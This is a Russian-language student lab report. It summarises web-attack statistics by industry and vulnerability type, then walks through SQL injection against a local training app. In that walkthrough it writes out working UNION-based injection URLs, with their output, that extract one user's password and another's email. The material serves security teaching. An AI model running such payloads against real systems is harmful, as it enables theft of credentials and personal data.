## 2. Доля атак через веб-уязвимости

По данным Positive Technologies (мир + СНГ), веб-ресурсы - основная цель примерно в **27–28 %** успешных атак на организации. Эксплуатация уязвимостей на внешнем периметре (а это в первую очередь веб-приложения) используется как начальный вектор проникновения в **~31 %** случаев.

По отраслям (scope) картина отличается:

| Отрасль | Доля атак через веб |
|---|---|
| Госучреждения | ~21 % |
| Промышленность | ~21 % |
| Финансовый сектор | ~5 % |

У финансов цифра низкая из-за жёстких регуляторных требований к безопасности - банки просто обязаны чаще патчиться и проходить аудит.

Verizon DBIR показывает ещё один интересный момент: из всех успешных базовых атак на веб-приложения **~88 %** связаны не со сложной эксплуатацией багов, а с использованием украденных или подобранных учёток. То есть главная «уязвимость» - это пароли.

## 3. Распределение по типам уязвимостей

Классика вроде SQL-инъекций и RCE сильно сдала позиции - суммарно **менее 5 %**. Современные фреймворки неплохо защищают от этого «из коробки».

Сейчас топ выглядит так:

| Тип уязвимости | Доля |
|---|---|
| Broken Access Control (нарушение контроля доступа) | ~30 % |
| XSS (межсайтовый скриптинг) | ~28 % |
| DoS на уровне приложения | ~22 % |
| Утечки данных через неправильное кэширование | ~11 % |

Broken Access Control - это когда один пользователь может добраться до данных или функций другого из-за некорректной проверки прав. XSS держится на втором месте стабильно уже несколько лет.

# ЧАСТЬ 2

Для начала просто потыкался по адресам от `?id=0` до `?id=10`, чтобы понять что вообще есть в базе. Страница показывает только id и логин пользователя.

```
http://localhost:8080/task/?id=1   -> admin
http://localhost:8080/task/?id=2   -> Volk
http://localhost:8080/task/?id=3   -> Matroskin
http://localhost:8080/task/?id=4   -> Vinni-pukh
http://localhost:8080/task/?id=5   -> Neznaika
http://localhost:8080/task/?id=6   -> kotenok
http://localhost:8080/task/?id=7   -> Karlson
http://localhost:8080/task/?id=8   -> Kesha
http://localhost:8080/task/?id=9   -> Volk2
http://localhost:8080/task/?id=10  -> (пусто)
```

Итого 9 пользователей. Нужные нам: `Vinni-pukh` - id=4, `Volk2` - id=9.

## Проверка на инъекцию

Попробовал просто добавить одинарную кавычку в параметр, как написано в шпаргалке (https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/):

```
http://localhost:8080/task/?id=1'
```

Страница вернула "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1" - это значит что кавычка сломала запрос и докер образ не обработывает ошибку. Инъекция есть.

## Определение числа столбцов

Чтобы использовать UNION, нужно знать сколько столбцов возвращает исходный запрос. Для этого из той же шпаргалки взял технику с `ORDER BY`:

```
http://localhost:8080/task/?id=1' ORDER BY 1-- -
http://localhost:8080/task/?id=1' ORDER BY 2-- -
http://localhost:8080/task/?id=1' ORDER BY 3-- -
```

Всё три работают - страница показывает данные. Попробовал 4:

```
http://localhost:8080/task/?id=1' ORDER BY 4-- -
```

Пустой вывод - значит четвёртого столбца нет. Итого в таблице **3 столбца**.

## Получение пароля Volk2

Страница выводит только `id` и `username`, пароль нигде не светится. Но раз есть UNION, можно подставить пароль на место одного из выводимых полей.

Сначала попробовал базовый вариант чтобы проверить что UNION вообще работает:

```
http://localhost:8080/task/?id=0' UNION SELECT 1,2,3-- -
```

Вернулось `id: 1, логин: 2` - отлично, второй столбец и есть `username` на экране. Значит туда и надо подставить пароль.

```
http://localhost:8080/task/?id=0' UNION SELECT 1,password,3 FROM users WHERE username='Volk2'-- -
```

Здесь `id=0` использую специально - такого пользователя нет, поэтому оригинальный запрос вернёт пустоту, а UNION вернёт только мою строку. Получил:

```
Ваш id: 1
Ваш логин: Wa spoiuuuuu
```

**Пароль Volk2: `Wa spoiuuuuu`**

## Получение email Vinni-pukh

Тут сложнее - на странице отображается только таблица `users` (id и логин), email там не хранится. Нужно найти другую таблицу. Попробовал стандартные названия: `emails`, `email`, `contacts`.

```
http://localhost:8080/task/?id=0' UNION SELECT 1,email_id,3 FROM emails WHERE id=4-- -
```

Сработало с первой попытки - таблица называется `emails`, поле `email_id`. id=4 - это Vinni-pukh, мы его нашли ещё на этапе разведки.

```
Ваш id: 1
Ваш логин: honey_lover@otus-lab.com
```

**Email Vinni-pukh: `honey_lover@otus-lab.com`**
